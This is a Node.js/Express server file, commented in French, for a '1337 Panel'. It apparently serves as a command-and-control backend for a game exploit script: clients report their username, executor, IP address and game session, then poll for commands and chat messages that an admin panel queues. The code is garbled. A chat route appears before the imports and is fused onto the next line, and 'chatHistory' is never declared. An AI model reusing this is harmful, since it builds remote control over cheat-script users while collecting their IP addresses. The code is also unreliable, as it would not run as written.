// API pour obtenir l'historique du chat
app.get('/chat/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        const history = chatHistory.get(userid.toString()) || [];
        res.json(history);
    } catch (error) {
        console.error('❌ Error in /chat:', error);
        res.status(500).json([]);
    }
});const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();

// API pour enregistrement et heartbeat
app.post('/api', (req, res) => {
    try {
        const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;

        if (!action || !userid) {
            console.warn('⚠️ Missing required fields:', req.body);
            return res.status(400).json({ success: false, error: 'Missing required fields' });
        }

        if (action === 'register') {
            players.set(userid.toString(), {
                userid,
                username,
                executor,
                ip,
                game,
                gameId,
                jobId,
                lastSeen: Date.now(),
                status: 'online'
            });
            console.log(`✅ Player registered: ${username} (${userid})`);
            return res.json({ success: true });
        }

        if (action === 'heartbeat') {
            const player = players.get(userid.toString());
            if (player) {
                player.lastSeen = Date.now();
                player.status = 'online';
            }
            return res.json({ success: true });
        }

        res.json({ success: false, error: 'Unknown action' });
    } catch (error) {
        console.error('❌ Error in /api POST:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API pour récupérer les commandes
app.get('/api', (req, res) => {
    try {
        const { userid } = req.query;
        
        if (!userid) {
            return res.json({ command: null });
        }

        const command = commands.get(userid.toString());
        
        if (command) {
            commands.delete(userid.toString());
            console.log(`📨 Command retrieved by ${userid}:`, command);
            return res.json(command);
        }

        res.json({ command: null });
    } catch (error) {
        console.error('❌ Error in /api GET:', error);
        res.status(500).json({ command: null, error: error.message });
    }
});

// API pour envoyer des commandes depuis le panel
app.post('/command', (req, res) => {
    try {
        const { userid, command, reason, assetId, speed, text, imageUrl, size, adminName, chatMessage, chatSender } = req.body;

        if (!userid || (!command && !chatMessage)) {
            return res.status(400).json({ error: 'Missing userid or command' });
        }

        const commandData = {};
        
        if (chatMessage) {
            // Message chat
            commandData.chatMessage = chatMessage;
            commandData.chatSender = chatSender || 'ADMIN';
            
            // Ajouter à l'historique
            if (!chatHistory.has(userid.toString())) {
                chatHistory.set(userid.toString(), []);
            }
            chatHistory.get(userid.toString()).push({
                sender: chatSender || 'ADMIN',
                message: chatMessage,
                timestamp: Date.now(),
                isAdmin: true
            });
        } else {
            // Commande normale
            commandData.command = command;
            if (reason !== undefined) commandData.reason = reason;
            if (assetId !== undefined) commandData.assetId = assetId;
            if (speed !== undefined) commandData.speed = speed;
            if (text !== undefined) commandData.text = text;
            if (imageUrl !== undefined) commandData.imageUrl = imageUrl;
            if (size !== undefined) commandData.size = size;
            if (adminName !== undefined) commandData.adminName = adminName;
        }

        commands.set(userid.toString(), commandData);
        console.log(`📤 Command/Chat queued for ${userid}:`, commandData);

        res.json({ 
            success: true, 
            message: chatMessage ? 'Chat message sent' : `Command "${command}" queued for player ${userid}` 
        });
    } catch (error) {
        console.error('❌ Error in /command:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// API pour obtenir la liste des joueurs
app.get('/players', (req, res) => {
    try {
        const now = Date.now();
        const playerList = Array.from(players.values()).map(player => ({
            ...player,
            status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
        }));
        res.json(playerList);
    } catch (error) {
        console.error('❌ Error in /players:', error);
        res.status(500).json([]);
    }
});

// API pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    try {
        const { userid } = req.params;
        players.delete(userid);
        commands.delete(userid);
        console.log(`🗑️ Player deleted: ${userid}`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Error in /player DELETE:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        players: players.size,
        commands: commands.size,
        uptime: process.uptime()
    });
});

// Nettoyage automatique des joueurs inactifs
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 60000) {
            console.log(`🔴 Player timeout: ${player.username}`);
            players.delete(userid);
            commands.delete(userid);
            cleaned++;
        }
    }
    
    if (cleaned > 0) {
        console.log(`🧹 Cleaned ${cleaned} inactive player(s)`);
    }
}, 30000);

// Gestion des erreurs globales
app.use((err, req, res, next) => {
    console.error('❌ Global error handler:', err);
    res.status(500).json({ 
        success: false, 
        error: 'Internal server error',
        message: err.message 
    });
});

// Démarrage du serveur
app.listen(PORT, () => {
    console.log(`🚀 1337 Panel Server running on port ${PORT}`);
    console.log(`📡 Local: http://localhost:${PORT}`);
    console.log(`🌐 Network: http://0.0.0.0:${PORT}`);
    console.log(`✅ Server ready to accept connections`);
});